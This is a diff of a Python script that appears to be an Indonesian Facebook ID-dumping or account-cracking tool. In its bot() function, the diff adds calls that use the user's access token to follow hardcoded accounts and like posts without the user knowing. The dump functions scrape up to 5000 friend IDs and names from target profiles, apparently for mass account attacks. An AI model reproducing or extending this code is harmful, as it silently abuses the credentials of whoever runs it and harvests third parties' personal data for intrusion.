@@ -142,8 +142,7 @@ def login_lagi():
 				jalan(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
 				jalan(' [%s!%s] Silahkan Masukan Kembali Perintah'%(M,N))
 				jalan(' [%s!%s] python Vip88.py!'%(M,N))
-				exit()
-	
+				exit()	
 
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 def bot():
@@ -152,8 +151,10 @@ def bot():
 		except IOError:
 			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
 		menu_test()
 		
 def menu_test():
@@ -410,7 +411,7 @@ def dump_publik():
 	print('\033[33m➣ 𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
 	pil = input('\033[33m➣ 𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
@@ -439,7 +440,7 @@ def dump_massal():
 		sol().print(pesan2)
 		exit()
 	if jum<1 or jum>10:
-		pesan = '# 𝑶𝒖𝒕 𝑶𝒇 𝑹𝒂𝒏𝒈𝒆 𝑴𝒆𝒏'
+		pesan = ' 𝑶𝒖𝒕 𝑶𝒇 𝑹𝒂𝒏𝒈𝒆 𝑴𝒆𝒏'
 		pesan2 = mark(pesan, style='red')
 		sol().print(pesan2)
 		exit()
@@ -462,11 +463,11 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			li = '# 𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉, 𝑷𝒆𝒓𝒊𝒌𝒔𝒂 & 𝑪𝒐𝒃𝒂 𝑳𝒂𝒈𝒊'
+			li = ' 𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉, 𝑷𝒆𝒓𝒊𝒌𝒔𝒂 & 𝑪𝒐𝒃𝒂 𝑳𝒂𝒈𝒊'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
-	tot = '# 𝑩𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝑴𝒆𝒏𝒈𝒖𝒎𝒑𝒖𝒍𝒌𝒂𝒏 %s 𝑰𝑫'%(len(id))
+	tot = ' 𝑩𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝑴𝒆𝒏𝒈𝒖𝒎𝒑𝒖𝒍𝒌𝒂𝒏 %s 𝑰𝑫'%(len(id))
 	if len(id)==0:
 		tot2 = mark(tot, style='red')
 	else:
